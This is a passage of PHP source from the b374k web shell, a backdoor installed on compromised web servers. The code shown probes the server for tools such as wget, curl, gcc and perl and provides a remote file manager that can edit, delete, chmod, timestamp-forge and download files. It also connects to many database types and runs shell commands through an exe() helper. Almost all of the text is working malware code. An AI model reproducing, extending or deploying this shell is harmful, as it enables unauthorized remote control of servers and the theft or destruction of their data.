			$s_cek = strtolower(exe("perl -h"));
			if(strpos($s_cek,"usage")!==false) $ver = exe("perl -e \"print \$]\"");
			break;
		case "ruby":
			$s_cek = strtolower(exe("ruby -h"));
			if(strpos($s_cek,"usage")!==false) $ver = exe("ruby -v");
			break;
		case "node":
			$s_cek = strtolower(exe("node -h"));
			if(strpos($s_cek,"usage")!==false) $ver = exe("node -v");
			break;
		case "gcc":
			$s_cek = strtolower(exe("gcc --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("gcc --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)&gt;0) $ver = $s_ver[0];
			}
			break;
		case "tar":
			$s_cek = strtolower(exe("tar --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("tar --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)&gt;0) $ver = $s_ver[0];
			}
			break;
		case "java":
			$s_cek = strtolower(exe("javac --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_cek = strtolower(exe("java -h"));
				if(strpos($s_cek,"usage")!==false) $ver = str_replace("\n", ", ", exe("java -version"));
			}
			break;
		case "wget":
			$s_cek = strtolower(exe("wget --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("wget --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)&gt;0) $ver = $s_ver[0];
			}
			break;
		case "lwpdownload":
			$s_cek = strtolower(exe("lwp-download --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("lwp-download --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)&gt;0) $ver = $s_ver[0];
			}
			break;
		case "lynx":
			$s_cek = strtolower(exe("lynx --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("lynx -version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)&gt;0) $ver = $s_ver[0];
			}
			break;
		case "curl":
			$s_cek = strtolower(exe("curl --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("curl --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)&gt;0) $ver = $s_ver[0];
			}
			break;
		default:
			return false;
	}
	if(!empty($ver)) $s_s = $ver;
	return $s_s;
}
// find available archiver
function get_archiver_available(){
	global $s_self, $s_tar;

	$s_dlfile = "";
	$s_avail_arc = array("raw" =&gt; "raw");

	if(class_exists("ZipArchive")) $s_avail_arc["ziparchive"] = "zip";
	if($s_tar){
		$s_avail_arc["tar"] = "tar";
		$s_avail_arc["targz"] = "tar.gz";
	}

	$s_option_arc = "";
	foreach($s_avail_arc as $s_t=&gt;$s_u) $s_option_arc .= "&lt;option value=\"".$s_t."\"&gt;".$s_u."&lt;/option&gt;";

	$s_dlfile .= "&lt;form action='".$s_self."' method='post'&gt;
				&lt;select onchange='download(this);' name='dltype' class='inputzbut' style='width:80px;height:20px;'&gt;
				&lt;option value='' disabled selected&gt;Download&lt;/option&gt;
				".$s_option_arc."
				&lt;/select&gt;
				&lt;input type='hidden' name='dlpath' value='__dlpath__' /&gt;
				&lt;/form&gt;";
	return $s_dlfile;
}
// explorer, return a table of given dir
function showdir($s_cwd){
	global $s_self, $s_win, $s_posix, $s_tar;

	$s_fname = $s_dname = array();
	$s_total_file = $s_total_dir = 0;

	if($s_dh = @opendir($s_cwd)){
		while($s_file = @readdir($s_dh)){
			if(@is_dir($s_file)) $s_dname[] = $s_file;
			elseif(@is_file($s_file))$s_fname[] = $s_file;
		}
		closedir($s_dh);
	}

	natcasesort($s_fname);
	natcasesort($s_dname);
	$s_list = array_merge($s_dname,$s_fname);

	if($s_win){
		//check if this root directory
		chdir("..");
		if(cp(getcwd())==cp($s_cwd)) array_unshift($s_list, ".");
		chdir($s_cwd);
	}

	$s_path = explode(DS,$s_cwd);
	$s_tree = sizeof($s_path);

	$s_parent = "";
	if($s_tree &gt; 2) for($s_i = 0; $s_i&lt;$s_tree-2; $s_i++) $s_parent .= $s_path[$s_i].DS;
	else $s_parent = $s_cwd;

	$s_owner_html = (!$s_win && $s_posix)? "&lt;th style='width:140px;min-width:140px;'&gt;owner:group&lt;/th&gt;":"";
	$s_colspan = (!$s_win && $s_posix)? "5" : "4";
	$s_buff = "
	&lt;table class='explore sortable'&gt;&lt;thead&gt;
	&lt;tr&gt;&lt;th style='width:24px;min-width:24px;' class='sorttable_nosort'&gt;&lt;/th&gt;&lt;th style='min-width:150px;'&gt;name&lt;/th&gt;&lt;th style='width:74px;min-width:74px;'&gt;size&lt;/th&gt;".$s_owner_html."&lt;th style='width:80px;min-width:80px;'&gt;perms&lt;/th&gt;&lt;th style='width:150px;min-width:150px;'&gt;modified&lt;/th&gt;&lt;th style='width:200px;min-width:200px;' class='sorttable_nosort'&gt;action&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;";

	$s_arc = get_archiver_available();
	foreach($s_list as $s_l){
		if(!$s_win && $s_posix){
			$s_name = posix_getpwuid(fileowner($s_l));
			$s_group = posix_getgrgid(filegroup($s_l));
			$s_owner = $s_name['name']."&lt;span class='gaya'&gt;:&lt;/span&gt;".$s_group['name'];
			$s_owner_html = "&lt;td style='text-align:center;'&gt;".$s_owner."&lt;/td&gt;";
		}

		$s_lhref = $s_lname = $s_laction = "";
		if(@is_dir($s_l)){
			if($s_l=="."){
				$s_lhref = $s_self."cd=".$s_cwd;
				$s_lsize = "LINK";
				$s_laction = "
				&lt;span id='titik1'&gt;
					&lt;a href='".$s_self."cd=".$s_cwd."&find=".$s_cwd."'&gt;find&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_cwd."&x=upload'&gt;upl&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_cwd."&edit=".$s_cwd."newfile_1&new=yes'&gt;+file&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik1','', 'mkdir','newfolder_1');\"&gt;+dir&lt;/a&gt;
				&lt;/span&gt;
				&lt;div id='titik1_form'&gt;&lt;/div&gt;";
			}
			elseif($s_l==".."){
				$s_lhref = $s_self."cd=".$s_parent;
				$s_lsize = "LINK";
				$s_laction = "
				&lt;span id='titik2'&gt;
					&lt;a href='".$s_self."cd=".$s_parent."&find=".$s_parent."'&gt;find&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_parent."&x=upload'&gt;upl&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_parent."&edit=".$s_parent."newfile_1&new=yes'&gt;+file&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik2','".adds($s_parent)."', 'mkdir','newfolder_1');\"&gt;+dir&lt;/a&gt;
				&lt;/span&gt;
				&lt;div id='titik2_form'&gt;&lt;/div&gt;";
			}
			else{
				$s_lhref = $s_self."cd=".$s_cwd.$s_l.DS;
				$s_lsize = "DIR";
				$s_laction = "
				&lt;span id='".cs($s_l)."_'&gt;
					&lt;a href='".$s_self."cd=".$s_cwd.$s_l.DS."&find=".$s_cwd.$s_l.DS."'&gt;find&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_cwd.$s_l.DS."&x=upload'&gt;upl&lt;/a&gt; | &lt;a href=\"javascript:tukar('".cs($s_l)."_','','rename','".$s_l."','".$s_l."');\"&gt;ren&lt;/a&gt; | &lt;a href='".$s_self."cd=".$s_cwd."&del=".$s_l."'&gt;del&lt;/a&gt;
				&lt;/span&gt;
				&lt;div id='".cs($s_l)."__form'&gt;&lt;/div&gt;";
				$s_total_dir++;
			}
			$s_lname = "[ ".$s_l." ]";
			$s_lsizetit = "0";
			$s_lnametit = "dir : ".$s_l;
		}
		else{
			$s_lhref = $s_self."view=".$s_cwd.$s_l;
			$s_lname = $s_l;
			$s_lsize = gs($s_l);
			$s_lsizetit = @filesize($s_l);
			$s_lnametit = "file : ".$s_l;
			$s_laction = "
			&lt;span id='".cs($s_l)."_'&gt;
				&lt;a href='".$s_self."edit=".$s_cwd.$s_l."'&gt;edit&lt;/a&gt; | &lt;a href='".$s_self."hexedit=".$s_cwd.$s_l."'&gt;hex&lt;/a&gt; | &lt;a href=\"javascript:tukar('".cs($s_l)."_','','rename','".$s_l."','".$s_l."');\"&gt;ren&lt;/a&gt; | &lt;a href='".$s_self."del=".$s_cwd.$s_l."'&gt;del&lt;/a&gt; | &lt;a href='".$s_self."dl=".$s_cwd.$s_l."'&gt;dl&lt;/a&gt;
			&lt;/span&gt;
			&lt;div id='".cs($s_l)."__form'&gt;&lt;/div&gt;";
			$s_total_file++;
		}

		$s_cboxval = $s_cwd.$s_l;
		if($s_l=='.') $s_cboxval = $s_cwd;
		if($s_l=='..') $s_cboxval = $s_parent;

		$s_cboxes_id = substr(md5($s_lhref),0,8);
		$s_cboxes = "&lt;input id='".$s_cboxes_id."' name='cbox' value='".$s_cboxval."' type='checkbox' class='css-checkbox' onchange='hilite(this);' /&gt;
					&lt;label for='".$s_cboxes_id."' class='css-label'&gt;&lt;/label&gt;";

		$s_ldl = str_replace("__dlpath__",$s_l,$s_arc);
		$s_ltime = filemtime($s_l);
		$s_buff .= "
		&lt;tr&gt;
		&lt;td style='text-align:center;text-indent:4px;'&gt;".$s_cboxes."&lt;/td&gt;
		&lt;td class='explorelist' title='".$s_lnametit."' ondblclick=\"return go('".adds($s_lhref)."',event);\"&gt;
			&lt;a href='".$s_lhref."'&gt;".$s_lname."&lt;/a&gt;
		&lt;/td&gt;
		&lt;td title='".$s_lsizetit."'&gt;".$s_lsize."&lt;/td&gt;
		".$s_owner_html."
		&lt;td style='text-align:center;'&gt;".gp($s_l)."&lt;/td&gt;
		&lt;td style='text-align:center;' title='".$s_ltime."'&gt;".@date("d-M-Y H:i:s",$s_ltime)."&lt;/td&gt;
		&lt;td&gt;".$s_laction."&lt;/td&gt;
		&lt;/tr&gt;";
	}
	$s_buff .= "&lt;/tbody&gt;";

	$s_extract = ""; $s_compress = "";
	if(class_exists("ZipArchive")){
		$s_extract .= "&lt;option value='extractzip'&gt;extract (zip)&lt;/option&gt;";
		$s_compress .= "&lt;option value='compresszip'&gt;compress (zip)&lt;/option&gt;";
	}
	if($s_tar){
		$s_extract .= "&lt;option value='extracttar'&gt;extract (tar)&lt;/option&gt;&lt;option value='extracttargz'&gt;extract (tar.gz)&lt;/option&gt;";
		$s_compress .="&lt;option value='compresstar'&gt;compress (tar)&lt;/option&gt;&lt;option value='compresstargz'&gt;compress (tar.gz)&lt;/option&gt;";
	}

	$s_extcom = ($s_extract!="" && $s_compress!="")? $s_extract."&lt;option value='' disabled&gt;-&lt;/option&gt;".$s_compress:$s_extract.$s_compress;

	$s_buff .= "&lt;tfoot&gt;&lt;tr class='cbox_selected'&gt;
			&lt;td class='cbox_all'&gt;&lt;input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();' /&gt; &lt;label for='checkalll' class='css-label'&gt;&lt;/label&gt;&lt;/td&gt;
			&lt;td&gt;
			&lt;form action='".$s_self."' method='post'&gt;
			&lt;select id='massact' class='inputzbut' onchange='massactgo();' style='width:100%;height:20px;margin:0;'&gt;
				&lt;option value='' disabled selected&gt;Action&lt;/option&gt;
				&lt;option value='cut'&gt;cut&lt;/option&gt;
				&lt;option value='copy'&gt;copy&lt;/option&gt;
				&lt;option value='paste'&gt;paste&lt;/option&gt;
				&lt;option value='delete'&gt;delete&lt;/option&gt;
				&lt;option value='' disabled&gt;-&lt;/option&gt;
				&lt;option value='chmod'&gt;chmod&lt;/option&gt;
				&lt;option value='touch'&gt;touch&lt;/option&gt;
				&lt;option value='' disabled&gt;-&lt;/option&gt;
				".$s_extcom."
			&lt;/select&gt;
			&lt;noscript&gt;&lt;input type='button' value='Go !' class='inputzbut' onclick='massactgo();' /&gt;&lt;/noscript&gt;&lt;/form&gt;
			&lt;/td&gt;&lt;td colspan='".$s_colspan."' style='text-align:left;'&gt;Total : ".$s_total_file." files, ".$s_total_dir." Directories&lt;span id='total_selected'&gt;&lt;/span&gt;&lt;/td&gt;
			&lt;/tr&gt;&lt;/tfoot&gt;
			&lt;/table&gt;";

	return $s_buff;
}
//database related functions
function sql_connect($s_sqltype, $s_sqlhost, $s_sqluser, $s_sqlpass){
	if($s_sqltype == 'mysql'){ if(function_exists('mysql_connect')) return @mysql_connect($s_sqlhost, $s_sqluser, $s_sqlpass); }
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_connect')) return @mssql_connect($s_sqlhost, $s_sqluser, $s_sqlpass);
		elseif(function_exists('sqlsrv_connect')){
			$s_coninfo = array("UID"=&gt;$s_sqluser, "PWD"=&gt;$s_sqlpass);
			return @sqlsrv_connect($s_sqlhost,$s_coninfo);
		}
	}
	elseif($s_sqltype == 'pgsql'){
		$s_hosts = explode(":", $s_sqlhost);
		if(count($s_hosts)==2){
			$s_host_str = "host=".$s_hosts[0]." port=".$s_hosts[1];
		}
		else $s_host_str = "host=".$s_sqlhost;
		if(function_exists('pg_connect')) return @pg_connect("$s_host_str user=$s_sqluser password=$s_sqlpass");
	}
	elseif($s_sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($s_sqluser, $s_sqlpass, $s_sqlhost); }
	elseif($s_sqltype == 'sqlite3'){
		if(class_exists('SQLite3')) if(!empty($s_sqlhost)) return new SQLite3($s_sqlhost);
		else return false;
	}
	elseif($s_sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($s_sqlhost); }
	elseif($s_sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($s_sqlhost, $s_sqluser, $s_sqlpass); }
	elseif($s_sqltype == 'pdo'){
		if(class_exists('PDO')) if(!empty($s_sqlhost)) return new PDO($s_sqlhost, $s_sqluser, $s_sqlpass);
		else return false;
	}
	return false;
}
function sql_query($s_sqltype, $s_query, $s_con){
	if($s_sqltype == 'mysql') return mysql_query($s_query);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_query')) return mssql_query($s_query);
		elseif(function_exists('sqlsrv_query')) return sqlsrv_query($s_con,$s_query);
	}
	elseif($s_sqltype == 'pgsql') return pg_query($s_query);
	elseif($s_sqltype == 'oracle') return oci_execute(oci_parse($s_con, $s_query));
	elseif($s_sqltype == 'sqlite3') return $s_con-&gt;query($s_query);
	elseif($s_sqltype == 'sqlite') return sqlite_query($s_con, $s_query);
	elseif($s_sqltype == 'odbc') return odbc_exec($s_con, $s_query);
	elseif($s_sqltype == 'pdo') return $s_con-&gt;query($s_query);
}
function sql_num_fields($s_sqltype, $s_hasil){
	if($s_sqltype == 'mysql') return mysql_num_fields($s_hasil);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_num_fields')) return mssql_num_fields($s_hasil);
		elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($s_hasil);
	}
	elseif($s_sqltype == 'pgsql') return pg_num_fields($s_hasil);
	elseif($s_sqltype == 'oracle') return oci_num_fields($s_hasil);
	elseif($s_sqltype == 'sqlite3') return $s_hasil-&gt;numColumns();
	elseif($s_sqltype == 'sqlite') return sqlite_num_fields($s_hasil);
	elseif($s_sqltype == 'odbc') return odbc_num_fields($s_hasil);
	elseif($s_sqltype == 'pdo') return $s_hasil-&gt;columnCount();
}
function sql_field_name($s_sqltype,$s_hasil,$s_i){
	if($s_sqltype == 'mysql') return mysql_field_name($s_hasil,$s_i);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_field_name')) return mssql_field_name($s_hasil,$s_i);
		elseif(function_exists('sqlsrv_field_metadata')){
			$s_metadata = sqlsrv_field_metadata($s_hasil);
			if(is_array($s_metadata)){
				$s_metadata=$s_metadata[$s_i];
			}
			if(is_array($s_metadata)) return $s_metadata['Name'];
		}
	}
	elseif($s_sqltype == 'pgsql') return pg_field_name($s_hasil,$s_i);
	elseif($s_sqltype == 'oracle') return oci_field_name($s_hasil,$s_i+1);
	elseif($s_sqltype == 'sqlite3') return $s_hasil-&gt;columnName($s_i);
	elseif($s_sqltype == 'sqlite') return sqlite_field_name($s_hasil,$s_i);
	elseif($s_sqltype == 'odbc') return odbc_field_name($s_hasil,$s_i+1);
	elseif($s_sqltype == 'pdo'){
		$s_res = $s_hasil-&gt;getColumnMeta($s_i);
		return $s_res['name'];
	}
}
function sql_fetch_data($s_sqltype,$s_hasil){
	if($s_sqltype == 'mysql') return mysql_fetch_row($s_hasil);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_fetch_row')) return mssql_fetch_row($s_hasil);
		elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($s_hasil,1);
	}
	elseif($s_sqltype == 'pgsql') return pg_fetch_row($s_hasil);
	elseif($s_sqltype == 'oracle') return oci_fetch_row($s_hasil);
	elseif($s_sqltype == 'sqlite3') return $s_hasil-&gt;fetchArray(1);
	elseif($s_sqltype == 'sqlite') return sqlite_fetch_array($s_hasil,1);
	elseif($s_sqltype == 'odbc') return odbc_fetch_array($s_hasil);
	elseif($s_sqltype == 'pdo') return $s_hasil-&gt;fetch(2);
}
function sql_num_rows($s_sqltype,$s_hasil){
	if($s_sqltype == 'mysql') return mysql_num_rows($s_hasil);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_num_rows')) return mssql_num_rows($s_hasil);
		elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($s_hasil);
	}
	elseif($s_sqltype == 'pgsql') return pg_num_rows($s_hasil);
	elseif($s_sqltype == 'oracle') return oci_num_rows($s_hasil);
	elseif($s_sqltype == 'sqlite3'){
		$s_metadata = $s_hasil-&gt;fetchArray();
		if(is_array($s_metadata)) return $s_metadata['count'];
	}
	elseif($s_sqltype == 'sqlite') return sqlite_num_rows($s_hasil);
	elseif($s_sqltype == 'odbc') return odbc_num_rows($s_hasil);
	elseif($s_sqltype == 'pdo') return $s_hasil-&gt;rowCount();
}
function sql_close($s_sqltype,$s_con){
	if($s_sqltype == 'mysql') return mysql_close($s_con);
	elseif($s_sqltype == 'mssql'){
		if(function_exists('mssql_close')) return mssql_close($s_con);
		elseif(function_exists('sqlsrv_close')) return sqlsrv_close($s_con);
	}
	elseif($s_sqltype == 'pgsql') return pg_close($s_con);
	elseif($s_sqltype == 'oracle') return oci_close($s_con);
	elseif($s_sqltype == 'sqlite3') return $s_con-&gt;close();
	elseif($s_sqltype == 'sqlite') return sqlite_close($s_con);
	elseif($s_sqltype == 'odbc') return odbc_close($s_con);
	elseif($s_sqltype == 'pdo') return $s_con = null;
}
if(!function_exists('str_split')){
	function str_split($s_t,$s_s=1){
		$s_a = array();
		for($s_i = 0; $s_i&lt;strlen($s_t);){
			$s_a[] = substr($s_t,$s_i,$s_s);
			$s_i += $s_s;
		}
		return $s_a;
	}
}

// appearance
$s_theme = "dark"; // default is dark
if(isset($_COOKIE['theme'])) $s_theme = $_COOKIE['theme'];
if(isset($_GP['x']) && ($_GP['x']=='switch')){
	if(isset($_COOKIE['theme'])) $s_theme = $_COOKIE['theme'];
	if($s_theme=="bright") $s_theme = "dark";
	else $s_theme = "bright";
	setcookie("theme", $s_theme ,time() + $s_login_time);
}

$s_dark = array("#000000", "#FFFFFF", "#222222", "#4C9CAF", "#111111", "#AAAAAA", "#292929", "#363636", "#191919", "#444444", "#CCCCCC", "#999999", "#202020");
$s_bright = array("#FFFFFF", "#000000", "#DDDDDD", "#B36350", "#EEEEEE", "#555555", "#D6D6D6", "#C9C9C9", "#E6E6E6", "#BBBBBB", "#333333", "#666666", "#DFDFDF");
$s_highlight_dark = array("4C9CAF", "888888", "87DF45", "EEEEEE" , "FF8000");
$s_highlight_bright = array("B36350", "777777", "7820BA", "111111" , "007FFF");
$s_color = ($s_theme=="bright")? $s_bright:$s_dark;
$s_checkbox = ($s_theme=="bright")? $s_bright_cb:$s_dark_cb;

global $s_self, $s_win, $s_posix;

$s_self = "?";
$s_cek1 = basename($_SERVER['SCRIPT_FILENAME']);
$s_cek2 = substr(basename(__FILE__),0,strlen($s_cek1));

if(isset($_COOKIE['b374k_included'])){
	if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
	else{
		$s_self = "?";
		setcookie("b374k_included", "0" ,time() - $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
}
else{
	if(strcmp($s_cek1,$s_cek2)!=0){
		if(!isset($_COOKIE['s_home'])){
			$s_home = "?".$_SERVER["QUERY_STRING"]."&";
			setcookie("s_home", $s_home ,time() + $s_login_time);
		}
		if(isset($s_home)) $s_self = $s_home;
		elseif(isset($_COOKIE['s_home'])) $s_self = $_COOKIE['s_home'];
		setcookie("b374k_included", "1" ,time() + $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
	else{
		$s_self = "?";
		setcookie("b374k_included", "0" ,time() - $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
}

if($s_auth){
	// server software
	$s_software = getenv("SERVER_SOFTWARE");
	// uname -a
	$s_system = php_uname();
	// check os
	$s_win = (strtolower(substr($s_system,0,3)) == "win")? true : false;
	// check for posix
	$s_posix = (function_exists("posix_getpwuid"))? true : false;
	// change working directory
	if(isset($_GP['cd'])){
		$s_dd = $_GP['cd'];
		if(@is_dir($s_dd)){
			$s_cwd = cp($s_dd);
			chdir($s_cwd);
			setcookie("cwd", $s_cwd ,time() + $s_login_time);
		}
	}
	else{
		if(isset($_COOKIE['cwd'])){
			$s_dd = ss($_COOKIE['cwd']);
			if(@is_dir($s_dd)){
				$s_cwd = cp($s_dd);
				chdir($s_cwd);
			}
		}
		else $s_cwd = cp(getcwd());
	}

	if(!$s_win && $s_posix){
		$s_userarr = posix_getpwuid(posix_geteuid());
		if(isset($s_userarr['name'])) $s_user = $s_userarr['name'];
		else $s_user = "$";
	}
	else {
		$s_user = get_current_user();
	}

	// prompt style
	$s_prompt = $s_user." &gt;";
	// server ip
	$s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
	// your ip <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_wink.gif" alt=";-)" class="wp-smiley" />
	$s_my_ip = $_SERVER['REMOTE_ADDR'];
	$s_result = "";

	global $s_python, $s_perl, $s_ruby, $s_node, $s_gcc, $s_java, $s_tar, $s_wget, $s_lwpdownload, $s_lynx, $s_curl;

	$s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_gcc", "s_java", "s_tar", "s_wget", "s_lwpdownload", "s_lynx", "s_curl");
	foreach($s_access as $s){
		if(isset($_COOKIE[$s])){ $$s = $_COOKIE[$s]; }
		else{
			if(!isset($_COOKIE['b374k'])){
				$t = explode("_", $s);
				$t = check_access($t[1]);
				if($t!==false){
					$$s = $t;
					setcookie($s, $$s ,time() + $s_login_time);
				}
			}
		}
	}

	if(!empty($_GP['dltype']) && !empty($_GP['dlpath'])){
		ob_end_clean();
		$s_dltype = $_GP['dltype'];
		$s_dlpath = $_GP['dlpath'];

		$s_dlname = basename($s_dlpath);
		if($s_dlpath==".") $s_dlname = basename($s_cwd);
		elseif($s_dlpath==".."){
			chdir("..");
			$s_dlname=basename(getcwd());
			chdir($s_cwd);
		}
		$s_tmpdir = get_writabledir();
		$s_dlarchive = $s_tmpdir.$s_dlname;
		$s_dlthis = "";
		if($s_dltype=="ziparchive"){
			$s_dlarchive .= ".zip";
			if(zip($s_dlpath,$s_dlarchive)) $s_dlthis = $s_dlarchive;
		}
		elseif($s_dltype=="tar"){
			$s_dlarchive .= ".tar";
			$s_dlarchive = str_replace('\\', '/', $s_dlarchive);
			exe("tar cf ".$s_dlarchive." ".$s_dlpath);
			$s_dlthis = $s_dlarchive;
		}
		elseif($s_dltype=="targz"){
			$s_dlarchive .= ".tar.gz";
			$s_dlarchive = str_replace('\\', '/', $s_dlarchive);
			exe("tar czf ".$s_dlarchive." ".$s_dlpath);
			$s_dlthis = $s_dlarchive;
		}
		elseif($s_dltype=="raw"){
			if(@is_file($s_dlpath)) $s_dlthis = $s_dlpath;
		}

		if(@is_file($s_dlthis)){
			header("Content-Type: application/octet-stream");
			header('Content-Transfer-Encoding: binary');
			header("Content-length: ".@filesize($s_dlthis));
			header("Content-disposition: attachment; filename=\"".basename($s_dlthis)."\";");
			$s_file = @fopen($s_dlthis,"rb");
			while(!feof($s_file)){
				print(@fread($s_file, 1024*8));
				ob_flush();
				flush();
			}
			fclose($s_file);

			if($s_dltype!="raw"){
				rename($s_dlthis,$s_dlthis."del");
				unlink($s_dlthis."del");
			}
			die();
		}
	}
	// download file specified by ?dl=&lt;file&gt;
	if(isset($_GP['dl']) && ($_GP['dl'] != "")){
		ob_end_clean();
		$f = $_GP['dl'];
		$fc = file_get_contents($f);
		header("Content-type: application/octet-stream");
		header("Content-length: ".strlen($fc));
		header("Content-disposition: attachment; filename=\"".basename($f)."\";");
		echo $fc;
		die();
	}
	// massact
	if(isset($_GP['z'])){
		$s_massact = isset($_COOKIE['massact'])? $_COOKIE['massact']:"";
		$s_buffer = isset($_COOKIE['buffer'])? rtrim(ss($_COOKIE['buffer']),"|"):"";
		$s_lists = explode("|", $s_buffer);

		$s_counter = 0;
		if(!empty($s_buffer)){
			if($_GP['z']=='moveok'){
				foreach($s_lists as $s_l) if(rename($s_l,$s_cwd.basename($s_l))) $s_counter++;
				if($s_counter&gt;0) $s_result .= notif($s_counter." items moved");
				else $s_result .= notif("No items moved");
			}
			elseif($_GP['z']=='copyok'){
				foreach($s_lists as $s_l){
					if(@is_dir($s_l)){
						copys($s_l,$s_cwd.basename($s_l));
						if(file_exists($s_cwd.basename($s_l))) $s_counter++;
					}
					elseif(@is_file($s_l)){
						copy($s_l,$s_cwd.basename($s_l));
						if(file_exists($s_cwd.basename($s_l))) $s_counter++;
					}
				}
				if($s_counter&gt;0) $s_result .= notif($s_counter." items copied");
				else $s_result .= notif("No items copied");
			}
			elseif($_GP['z']=='delok'){
				foreach($s_lists as $s_l){
					if(@is_file($s_l)){
						if(unlink($s_l)) $s_counter++;
					}
					elseif(@is_dir($s_l)){
						rmdirs($s_l);
						if(!file_exists($s_l)) $s_counter++;
					}
				}
				if($s_counter&gt;0) $s_result .= notif($s_counter." items deleted");
				else $s_result .= notif("No items deleted");
			}
			elseif(isset($_GP['chmodok'])){
				$s_mod = octdec($_GP['chmodok']);
				foreach($s_lists as $s_l) if(chmod($s_l,$s_mod)) $s_counter++;
				if($s_counter&gt;0) $s_result .= notif($s_counter." items changed mode to ".decoct($s_mod));
				else $s_result .= notif("No items modified");
			}
			elseif(isset($_GP['touchok'])){
				$s_datenew = strtotime($_GP['touchok']);
				foreach($s_lists as $s_l) if(touch($s_l,$s_datenew)) $s_counter++;
				if($s_counter&gt;0) $s_result .= notif($s_counter." items changed access and modification time to ".@date("d-M-Y H:i:s",$s_datenew));
				else $s_result .= notif("No items modified");
			}
			elseif(isset($_GP['compresszipok'])){
				$s_file = $_GP['compresszipok'];
				if(zip($s_lists, $s_file)) $s_result .= notif("Archive created : ".$s_file);
				else $s_result .= notif("Error creating archive file");
			}
			elseif(isset($_GP['compresstarok'])){
				$s_lists_ = array();
				$s_file = $_GP['compresstarok'];
				$s_file = basename($s_file);

				$s_lists__ = array_map("basename", $s_lists);
				$s_lists_ = array_map("pf", $s_lists__);
				exe("tar cf \"".$s_file."\" ".implode(" ", $s_lists_));

				if(@is_file($s_file)) $s_result .= notif("Archive created : ".$s_file);
				else $s_result .= notif("Error creating archive file");
			}
			elseif(isset($_GP['compresstargzok'])){
				$s_lists_ = array();
				$s_file = $_GP['compresstargzok'];
				$s_file = basename($s_file);

				$s_lists__ = array_map("basename", $s_lists);
				$s_lists_ = array_map("pf", $s_lists__);
				exe("tar czf \"".$s_file."\" ".implode(" ", $s_lists_));

				if(@is_file($s_file)) $s_result .= notif("Archive created : ".$s_file);
				else $s_result .= notif("Error creating archive file");
			}
			elseif(isset($_GP['extractzipok'])){
				$s_file = $_GP['extractzipok'];
				$zip = new ZipArchive();
				foreach($s_lists as $f){
					$s_target = $s_file.basename($f,".zip");
					if($zip-&gt;open($f)){
						if(!@is_dir($s_target)) @mkdir($s_target);
						if($zip-&gt;extractTo($s_target)) $s_result .= notif("Files extracted to ".$s_target);
						else $s_result .= notif("Error extrating archive file");
						$zip-&gt;close();
					}
					else $s_result .= notif("Error opening archive file");
				}
			}
			elseif(isset($_GP['extracttarok'])){
				$s_file = $_GP['extracttarok'];
				foreach($s_lists as $f){
					$s_target = "";
					$s_target = basename($f,".tar");
					if(!@is_dir($s_target)) @mkdir($s_target);
					exe("tar xf \"".basename($f)."\" -C \"".$s_target."\"");
				}
			}
			elseif(isset($_GP['extracttargzok'])){
				$s_file = $_GP['extracttargzok'];
				foreach($s_lists as $f){
					$s_target = "";
					if(strpos(strtolower($f), ".tar.gz")!==false) $s_target = basename($f,".tar.gz");
					elseif(strpos(strtolower($f), ".tgz")!==false) $s_target = basename($f,".tgz");
					if(!@is_dir($s_target)) @mkdir($s_target);
					exe("tar xzf \"".basename($f)."\" -C \"".$s_target."\"");
				}
			}
		}
		setcookie("buffer", "" ,time() - $s_login_time);
		setcookie("massact", "" ,time() - $s_login_time);
	}
	if(isset($_GP['y'])){
		$s_massact = isset($_COOKIE['massact'])? $_COOKIE['massact']:"";
		$s_buffer = isset($_COOKIE['buffer'])? rtrim(ss($_COOKIE['buffer']),"|"):"";
		$s_lists = explode("|", $s_buffer);

		if(!empty($s_buffer)){
			if($_GP['y']=='delete'){
				$s_result .= notif("Delete ? &lt;a href='".$s_self."z=delok'&gt;Yes&lt;/a&gt; | &lt;a href='".$s_self."'&gt;No&lt;/a&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='paste' && $s_massact=='cut'){
				$s_result .= notif("Move here ? &lt;a href='".$s_self."z=moveok'&gt;Yes&lt;/a&gt; | &lt;a href='".$s_self."'&gt;No&lt;/a&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
